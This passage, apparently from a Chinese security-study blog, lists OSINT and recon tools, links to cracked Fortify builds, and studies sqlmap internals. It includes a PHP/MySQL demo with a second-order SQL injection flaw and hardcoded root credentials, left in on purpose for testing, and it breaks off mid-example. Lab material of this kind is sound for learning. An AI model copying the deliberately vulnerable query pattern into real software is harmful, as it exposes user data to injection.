<h4 id="搜索引擎-google-amp-fofa"><a href="#搜索引擎-google-amp-fofa" class="headerlink" title="搜索引擎-google&amp;fofa"></a>搜索引擎-google&amp;fofa</h4><h4 id="搜索引擎-x2F-网络空间测绘-shodan-amp-CenSys-amp-DNSdb-amp-Spyse"><a href="#搜索引擎-x2F-网络空间测绘-shodan-amp-CenSys-amp-DNSdb-amp-Spyse" class="headerlink" title="搜索引擎&#x2F;网络空间测绘-shodan&amp;CenSys&amp;DNSdb&amp;Spyse"></a>搜索引擎&#x2F;网络空间测绘-shodan&amp;CenSys&amp;DNSdb&amp;Spyse</h4><h4 id="社交媒体-rocketreach"><a href="#社交媒体-rocketreach" class="headerlink" title="社交媒体-rocketreach"></a>社交媒体-rocketreach</h4><p>url链接：<a href="https://rocketreach.co/">https://rocketreach.co/</a><br>使用twitter、.googlel账号登陆即可查询</p>
<p>通过ip查社交媒体</p>
<h4 id="邮件信息收集-hunter-amp-phonebook-amp-infoga"><a href="#邮件信息收集-hunter-amp-phonebook-amp-infoga" class="headerlink" title="邮件信息收集-hunter&amp;phonebook&amp;infoga"></a>邮件信息收集-hunter&amp;phonebook&amp;infoga</h4><p>url链接：<a href="https://hunter.io/">https://hunter.io/</a><br>输入需要查询的邮件后缀，即可查看部分，然后再点击来源即可看到详情</p>
<p>url链接：<a href="https://phonebook.cz/">https://phonebook.cz/</a>  （效果很好）<br>输入需要查询的邮件后缀，即可查询邮件名（网站中有其他功能但是都不太好用），该网站的数据是从<a href="https://intelx.io/%E4%B8%AD%E6%89%BE%E7%9A%84%E6%95%B0%E6%8D%AE">https://intelx.io/中找的数据</a></p>
<p>url链接：<a href="https://github.com/m4IIok/infoga">https://github.com/m4IIok/infoga</a><br>功能：从不同公共来源（搜索引擎、pgp密钥服务器和shodan)收集电子邮件帐户信息(IP、主机名、国家&#x2F;地区…)的工具，并使用haveibeenpned.com API检查电子邮件是否泄露</p>
<h4 id="临时邮件-fakemailgenerator-amp-kuku"><a href="#临时邮件-fakemailgenerator-amp-kuku" class="headerlink" title="临时邮件-fakemailgenerator&amp;kuku"></a>临时邮件-fakemailgenerator&amp;kuku</h4><p>url链接：<a href="http://www.fakemailgenerator.com/">http://www.fakemailgenerator.com/</a><br>功能：生成假造身份后可获得一个邮件地址，该邮件地址可以收邮件内容</p>
<p>url链接：<a href="https://m.kuku.lu/">https://m.kuku.lu/</a><br>直接使用，可以首发邮件且无需注册</p>
<h4 id="商业记录-天眼查-x2F-爱企查-x2F-企查查"><a href="#商业记录-天眼查-x2F-爱企查-x2F-企查查" class="headerlink" title="商业记录-天眼查&#x2F;爱企查&#x2F;企查查"></a>商业记录-天眼查&#x2F;爱企查&#x2F;企查查</h4><p>url链接：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a><br>url链接：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a><br>url链接：<a href="https://www.qcc.com/">https://www.qcc.com/</a><br>股权穿透、子母公司、相关产品和地址、备案信息查询等信息</p>
<h4 id="IP定位-ipuu"><a href="#IP定位-ipuu" class="headerlink" title="IP定位-ipuu"></a>IP定位-ipuu</h4><p>url链接：<a href="https://www.ipuu.net/">https://www.ipuu.net</a><br>高精度定位P所在区域，需要登陆后查询（高精度查询每日有查询上限）</p>
<h4 id="综合信息收集-xray"><a href="#综合信息收集-xray" class="headerlink" title="综合信息收集-xray"></a>综合信息收集-xray</h4><p>详细使用文档：<a href="https://docs.xray.cool/#/">https://docs.xray.cool/#/</a></p>
<h4 id="综合信息收集-Maltego"><a href="#综合信息收集-Maltego" class="headerlink" title="综合信息收集-Maltego"></a>综合信息收集-Maltego</h4><p>url链接：<a href="https://www.maltego.com/">https://www.maltego.com/</a><br>在官网可以直接下载，Mac、Windows、Linux版本(kali自带)<br>在官网注册一个账号即可直接使用（分收费版、免费版）<br>鼠标右键即可出来<br>可以查dns解析、子域名、邮箱关联等信息</p>
<h4 id="代码信息泄露-github-amp-searchcode"><a href="#代码信息泄露-github-amp-searchcode" class="headerlink" title="代码信息泄露-github&amp;searchcode"></a>代码信息泄露-github&amp;searchcode</h4><p><a href="https://searchcode.com/">https://searchcode.com/</a></p>
<h4 id="密码信息泄漏-intelx"><a href="#密码信息泄漏-intelx" class="headerlink" title="密码信息泄漏-intelx"></a>密码信息泄漏-intelx</h4><p>url链接：<a href="https://intelx.io/">https://intelx.io/</a><br>随便注册一个账号即可查询</p>
<h4 id="交通信息收集-火车地铁"><a href="#交通信息收集-火车地铁" class="headerlink" title="交通信息收集-火车地铁"></a>交通信息收集-火车地铁</h4><p>url链接：<a href="https://www.openrailwaymap.org/">https://www.openrailwaymap.org/</a><br>查线路情况，高速段落、专用线段落</p>
<h4 id="交通信息收集-飞机"><a href="#交通信息收集-飞机" class="headerlink" title="交通信息收集-飞机"></a>交通信息收集-飞机</h4><p>url链接：<br>航旅纵横app<br><a href="https://www.flightradar24.com/">https://www.flightradar24.com/</a><br>直接章询即可，包括每一趟航天高度、时速、现在位置</p>
<h2 id="web测试-业务逻辑漏洞"><a href="#web测试-业务逻辑漏洞" class="headerlink" title="web测试-业务逻辑漏洞"></a>web测试-业务逻辑漏洞</h2><p><a href="https://blog.csdn.net/weixin_48421613/article/details/121008379">常见的业务逻辑漏洞-整合篇_vlan911的博客-CSDN博客</a></p>
<p><a href="https://www.freebuf.com/vuls/281141.html">逻辑漏洞梳理与总结 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/m0_57751431/article/details/119333788">业务逻辑漏洞总结_Andy数宇的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/weixin_48421613/article/details/121008379">https://blog.csdn.net/weixin_48421613/article/details/121008379</a></p>
<h2 id="APP测试"><a href="#APP测试" class="headerlink" title="APP测试"></a>APP测试</h2><h3 id="安卓客户端测试流程"><a href="#安卓客户端测试流程" class="headerlink" title="安卓客户端测试流程"></a>安卓客户端测试流程</h3><p>客户端静态安全<br>客户端数据安全<br>客户端运行时安全<br>安全策略<br>通信安全</p>
<h3 id="IOS客户端测试流程"><a href="#IOS客户端测试流程" class="headerlink" title="IOS客户端测试流程"></a>IOS客户端测试流程</h3><p>客户端安全<br>网络通信安全<br>安全策略检测<br>可选测试项</p>
<h3 id="Drozer使用"><a href="#Drozer使用" class="headerlink" title="Drozer使用"></a>Drozer使用</h3><h3 id="安卓脱壳入门"><a href="#安卓脱壳入门" class="headerlink" title="安卓脱壳入门"></a>安卓脱壳入门</h3><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="代码审计工具"><a href="#代码审计工具" class="headerlink" title="代码审计工具"></a>代码审计工具</h3><p><a href="https://www.ddosi.org/fortify/">Fortify SCA 20.2.2 cracked Fortify破解版 - 🔰雨苁ℒ🔰 (ddosi.org)</a></p>
<p><a href="https://cn-sec.com/archives/1496150.html">fortify_sca_22.2-Windows-linux破解版 | CN-SEC 中文网</a></p>
<p><a href="https://blog.csdn.net/qq_40597962/article/details/118490818">Fortify介绍及使用教程_fortify 使用方法_「已注销」的博客-CSDN博客</a></p>
<p>[第37篇：fortify代码审计工具的使用技巧(1)-审计java代码过程 - 腾讯云开发者社区-腾讯云 (tencent.com)](<a href="https://cloud.tencent.com/developer/article/2225044#:~:text=Fortify%E9%BB%98%E8%AE%A4%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8D%E6%98%AFUTF-8%EF%BC%8C%E5%AF%BC%E8%87%B4%E9%83%A8%E5%88%86%E4%B8%AD%E6%96%87%E7%9A%84Java%E4%BB%A3%E7%A0%81%E4%BC%9A%E5%87%BA%E7%8E%B0%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E3%80%82">https://cloud.tencent.com/developer/article/2225044#:~:text=Fortify默认的编码不是UTF-8，导致部分中文的Java代码会出现乱码问题。</a> 如果是单文件乱码，可以使用 Edit 选项卡下的,Set Encoding 进行设置， 鼠标光标在右侧代码框内点击一下，否则此项功能不能用 ，但是这种方法只适用于单个文件的乱码解决。)</p>
<p><a href="https://www.cnblogs.com/happylumei/p/16731407.html">【安全测试】【fortify】fortify设置中文语言 - 码上起舞 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>安全</tag>
        <tag>安服</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap_study</title>
    <url>/2023/04/08/sqlmap-study/</url>
    <content><![CDATA[<p>参考：<a href="https://blog.csdn.net/q20010619/article/details/122243790">sqlmap深入分析-优质文章整理篇（sqlmap 源码分析、os-shell 原理、攻防角度使用sqlmap）_sqlmap源码分析_OceanSec的博客-CSDN博客</a></p>
<p>在使用sqlmap时存在以下的问题：</p>
<p>1、有回显的是如何判断哪个对应哪个的，如果回显编码了怎么办（如base64）</p>
<p>2、怎样判断是否存在注入？一个界面元素不少，如果只是单纯回显一些会变的垃圾信息呢</p>
<p>3、启发式测试是什么</p>
<p>……</p>
<span id="more"></span>

<h2 id="我的测试环境"><a href="#我的测试环境" class="headerlink" title="我的测试环境"></a>我的测试环境</h2><p>sqlmap版本：1.5.10.17#dev</p>
<p>在buuctf上弄动态靶场</p>
<p>然后pycharm断点运行</p>
<h2 id="sqlmap自己分析"><a href="#sqlmap自己分析" class="headerlink" title="sqlmap自己分析"></a>sqlmap自己分析</h2><h2 id="sqlmap-项目剖析（I）-使用"><a href="#sqlmap-项目剖析（I）-使用" class="headerlink" title="sqlmap 项目剖析（I）-使用"></a>sqlmap 项目剖析（I）-使用</h2><h3 id="0x00-sqlmap-介绍"><a href="#0x00-sqlmap-介绍" class="headerlink" title="0x00 sqlmap 介绍"></a>0x00 sqlmap 介绍</h3><p>sqlmap 是一款开源的自动化 SQL 注入测试及漏洞利用工具，有着十余年的开发历史（当然这也造就了一些问题），这款工具最强大的地方在于它对数据库种类以及注入类型的支持堪称史诗级。</p>
<p><a href="https://www.anquanke.com/post/id/262848">sqlmap 项目剖析（I）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>使用懒得写了，上面的链接有说。</p>
<p>主要记录自己不是很熟练的部分。</p>
<p>1、指定 burp log 作为目标输入</p>
<p>首先开启 burpsuite 的请求日志记录功能</p>
<p>后续在抓包时相关的包会被保存到对应的日志文件里</p>
<p>此时结合 sqlmap -l 的参数即可对此日志中的数据包进行自动化注入测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l burp.log</span><br></pre></td></tr></table></figure>

<p>2、二次注入</p>
<p>sqlmap 同样支持二次注入场景下的测试与利用，这个功能主要是依赖于 <code>--second-*</code> 参数进行实现。</p>
<p>自己写了个简单的demo测试：</p>
<p>新建数据库test。</p>
<p>sql语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 创建second数据库</span><br><span class="line">CREATE DATABASE IF NOT EXISTS `second`;</span><br><span class="line"></span><br><span class="line">-- 使用second数据库</span><br><span class="line">USE `second`;</span><br><span class="line"></span><br><span class="line">-- 创建users表</span><br><span class="line">CREATE TABLE IF NOT EXISTS `users` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `username` varchar(255) NOT NULL,</span><br><span class="line">  `password` varchar(255) NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line">-- 插入测试数据</span><br><span class="line">INSERT INTO `users` (`id`, `username`, `password`) VALUES</span><br><span class="line">(1, &#x27;admin&#x27;, &#x27;admin123&#x27;),</span><br><span class="line">(2, &#x27;user1&#x27;, &#x27;password1&#x27;),</span><br><span class="line">(3, &#x27;user2&#x27;, &#x27;password2&#x27;);</span><br></pre></td></tr></table></figure>

<p>first.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建数据库连接</span></span><br><span class="line"><span class="comment">// 显示所有错误信息</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>; <span class="comment">// 数据库服务器地址</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;second&quot;</span>; <span class="comment">// 数据库名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// $password = addslashes($_GET[&#x27;password&#x27;]);</span></span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]); <span class="comment">// 转义特殊字符</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;replace into users(id,username,password)values(1,&#x27;admin&#x27;,&#x27;<span class="subst">$password</span>&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>second.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建数据库连接</span></span><br><span class="line"><span class="comment">// 显示所有错误信息</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;display_errors&#x27;, 1);</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;display_startup_errors&#x27;, 1);</span></span><br><span class="line"><span class="comment">// error_reporting(E_ALL);</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>; <span class="comment">// 数据库服务器地址</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>; <span class="comment">// 数据库密码</span></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;second&quot;</span>; <span class="comment">// 数据库名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="string">&#x27;select password from users where id=1;&#x27;</span>);</span><br><span class="line"><span class="comment">// 输出查询结果</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_ASSOC)) &#123;</span><br><span class="line">        <span class="comment">// echo var_dump($row);</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$row</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$result1</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="string">&quot;select * from users where password = &#x27;<span class="subst">$value</span>&#x27;;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result1</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$row1</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result1</span>, MYSQLI_ASSOC)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$row1</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$row1</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230426164201842.png" alt="image-20230426164201842"></p>
<h2 id="sqlmap-项目剖析（II）"><a href="#sqlmap-项目剖析（II）" class="headerlink" title="sqlmap 项目剖析（II）"></a>sqlmap 项目剖析（II）</h2><p><a href="https://www.anquanke.com/post/id/262847">sqlmap 项目剖析（II）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>sqlmap步骤：</p>
<ul>
<li>全局变量初始化</li>
<li>命令行参数解析</li>
<li>全局变量赋值</li>
<li>环境检查</li>
<li>目标连通性检查</li>
<li>WAF 探测</li>
<li>页面动态内容提取</li>
<li>参数动态性检测</li>
<li>启发式测试</li>
</ul>
<p>下面挑一点详细的看</p>
<h3 id="初始化流程"><a href="#初始化流程" class="headerlink" title="初始化流程"></a>初始化流程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Main function of sqlmap when running from command line.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dirtyPatches()</span><br><span class="line">        resolveCrossReferences()</span><br><span class="line">        checkEnvironment()</span><br><span class="line">        setPaths(modulePath())</span><br><span class="line">        banner()</span><br><span class="line"></span><br><span class="line">        args = cmdLineParser()</span><br><span class="line">        cmdLineOptions.update(args.__dict__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(args, <span class="string">&quot;__dict__&quot;</span>) <span class="keyword">else</span> args)</span><br><span class="line">        initOptions(cmdLineOptions)</span><br><span class="line"></span><br><span class="line">        init()</span><br><span class="line">        start()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>todo</title>
    <url>/2023/05/24/todo/</url>
    <content><![CDATA[<p><a href="https://www.bilibili.com/video/BV1Sv4y1i7jf/?spm_id_from=333.337.search-card.all.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">B站最全的Java安全学习路线_哔哩哔哩_bilibili</a></p>
<p>Java安全{<br>    IDEA （finish）<br>    Maven <a href="https://www.bilibili.com/video/BV1Ah411S7ZE/?spm_id_from=333.337.search-card.all.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">黑马程序员Maven全套教程，maven项目管理从基础到高级，Java项目开发必会管理工具maven_哔哩哔哩_bilibili</a>	，<a href="https://mvnrepository.com/">Maven Repository: Search&#x2F;Browse&#x2F;Explore (mvnrepository.com)</a>，<a href="https://zhuanlan.zhihu.com/p/37701743">java注解-最通俗易懂的讲解 - 知乎 (zhihu.com)</a></p>
<span id="more"></span>

<p>Java Web</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尚硅谷p21</span><br><span class="line"></span><br><span class="line">黑马https://www.bilibili.com/video/BV1m84y1w7Tb</span><br><span class="line">p79</span><br></pre></td></tr></table></figure>

<p>​	反射<br>​	ASM&#x2F;Javassist<br>​	JNDI：8u191低版本和高版本怎么打(反序列化&#x2F;本地工厂)，以及如何审计<br>​	RMI是什么<br>​	Java Agent：启动原理和RASP的实现原理<br>​	JMX&#x2F;JDWP<br>​	反序列化基础：gadget链、JEP290是什么<br>​	FastJson反序列化<br>​	WebLogic：二次反序列化、XML Decoder、IIOP&#x2F;T3<br>​	Xstream反序列化<br>​	Hessian反序列化：dubbo<br>​	SnakeYAML反序列化<br>​	Shiro：Shiro经典漏洞、Padding Oracle漏洞形成原理、如何通过Shiro注入内存马<br>​	Struts2<br>​	Spring：Spring4Shell、Spring EL、SpringBoot Actuator利用<br>​	Tomcat：Tomcat AJP RCE<br>​	内存马原理：原理是什么、有哪些内存马<br>​	内存马如何查杀<br>​	Log4J<br>​	其他组件漏洞：Apache Solr、Flink<br>​	进阶：tabby、codeql等静态分析<br>}</p>
<p><del>真多</del></p>
<h2 id="TODO："><a href="#TODO：" class="headerlink" title="TODO："></a>TODO：</h2><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">status</th>
</tr>
</thead>
<tbody><tr>
<td align="center">了解jsp shell</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">正则表达式</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">P神java安全漫谈学习</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">jsfinder 使用</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">jsfinder代码理解</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">sqlmap源码学习</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">DIVA study</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">学习免杀与查杀</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">了解fastjson漏洞原理</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">了解cors的危害</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">了解正则表达式</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">了解shiro漏洞</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Ldap注入</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">leetcode top100</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">log4j漏洞分析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">mysql学习</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h3 id="了解fastjson反序列化漏洞原理："><a href="#了解fastjson反序列化漏洞原理：" class="headerlink" title="了解fastjson反序列化漏洞原理："></a>了解fastjson反序列化漏洞原理：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastjson 教程：https://www.bilibili.com/video/BV1Hy4y1x7ri/?spm_id_from=333.337.search-card.all.click&amp;vd_source=d1cb46e12f3981bbb347ae0eb3b44edd</span><br><span class="line"></span><br><span class="line">靶场复现：https://blog.csdn.net/Bossfrank/article/details/130100893</span><br><span class="line"></span><br><span class="line">漏洞原理：https://www.freebuf.com/vuls/361576.html</span><br></pre></td></tr></table></figure>

<h3 id="Cors漏洞原理："><a href="#Cors漏洞原理：" class="headerlink" title="Cors漏洞原理："></a>Cors漏洞原理：</h3><h3 id="JSP-shell"><a href="#JSP-shell" class="headerlink" title="JSP shell"></a>JSP shell</h3><p><a href="https://www.runoob.com/jsp/jsp-tutorial.html">JSP 教程 | 菜鸟教程 (runoob.com)</a></p>
<p><a href="https://xz.aliyun.com/t/7798">都0202年了老嗨还在用的 - 各种姿势jsp webshell - 先知社区 (aliyun.com)</a></p>
<p><a href="https://blog.csdn.net/s452195377/article/details/93388422">tomcat下jsp shell（webshell）_shell.jsp_夜行侠~@的博客-CSDN博客</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1667652">【实战篇】记一次文件上传漏洞绕过 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a href="https://www.cnblogs.com/blacksunny/p/8001201.html">文件上传漏洞（绕过姿势） - blacksunny - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/straycats/p/14461357.html">https://www.cnblogs.com/straycats/p/14461357.html</a></p>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p><a href="https://blog.csdn.net/pagean/article/details/106032082">一篇认真的正则入门文章：正则表达式数字和数字范围匹配表达_正则表达式匹配数字范围_曼巴的脚步的博客-CSDN博客</a></p>
<p><a href="https://www.runoob.com/python/python-reg-expressions.html">Python 正则表达式 | 菜鸟教程 (runoob.com)</a></p>
<p><a href="https://www.sojson.com/regex/generate">正则表达式生成器，常用正则表达式在线生成 (sojson.com)</a></p>
<p><a href="https://www.mklab.cn/utils/regex">Regex正则表达式在线测试生成工具 - MKLab在线工具</a></p>
<p><a href="https://www.cnblogs.com/admans/p/11955614.html#:~:text=%E4%BB%8E%E6%AD%A3%E5%88%99%E8%AF%AD%E6%B3%95%E7%9A%84%E8%A7%92%E5%BA%A6%E6%9D%A5%E8%AE%B2%EF%BC%8C%E8%A2%AB%E5%8C%B9%E9%85%8D%E4%BC%98%E5%85%88%E9%87%8F%E8%AF%8D%E4%BF%AE%E9%A5%B0%E7%9A%84%E5%AD%90%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E5%B0%B1%E6%98%AF%E8%B4%AA%E5%A9%AA%E6%A8%A1%E5%BC%8F%EF%BC%8C%E5%A6%82%E2%80%9C,(Expression">正则表达式之 贪婪与非贪婪模式详解（概述） - JackieZhengChina - 博客园 (cnblogs.com)</a>%2B”；被忽略优先量词修饰的子表达式使用的就是非贪婪模式，如“ (Expression)%2B%3F”。)</p>
<p><a href="https://blog.csdn.net/jly164260234/article/details/83215924">Python—re.findall的用法_扫地di的博客-CSDN博客</a></p>
<p>正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。</p>
<p>re 模块使 Python 语言拥有全部的正则表达式功能。</p>
<p>compile 函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。re 模块也提供了与这些方法功能完全一致的函数，这些函数使用一个模式字符串做为它们的第一个参数。</p>
<h4 id="re-match函数"><a href="#re-match函数" class="headerlink" title="re.match函数"></a>re.match函数</h4><p>re.match 尝试从字符串的<strong>起始位置</strong>匹配一个模式，如果不是起始位置匹配成功的话，match() 就返回 none。</p>
<p>语法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">re.match(pattern, string, flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">pattern</td>
<td align="center">匹配的正则表达式</td>
</tr>
<tr>
<td align="center">string</td>
<td align="center">要匹配的字符串。</td>
</tr>
<tr>
<td align="center">flags</td>
<td align="center">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。参见：<a href="https://www.runoob.com/python/python-reg-expressions.html#flags">正则表达式修饰符 - 可选标志</a></td>
</tr>
</tbody></table>
<p>re的修饰符：</p>
<table>
<thead>
<tr>
<th align="center">修饰符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">re.I</td>
<td align="center">使匹配对大小写不敏感</td>
</tr>
<tr>
<td align="center">re.L</td>
<td align="center">做本地化识别（locale-aware）匹配</td>
</tr>
<tr>
<td align="center">re.M</td>
<td align="center">多行匹配，影响 ^ 和 $</td>
</tr>
<tr>
<td align="center">re.S</td>
<td align="center">使 . 匹配包括换行在内的所有字符</td>
</tr>
<tr>
<td align="center">re.U</td>
<td align="center">根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.</td>
</tr>
<tr>
<td align="center">re.X</td>
<td align="center">该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</td>
</tr>
</tbody></table>
<p>下面讲个例子：</p>
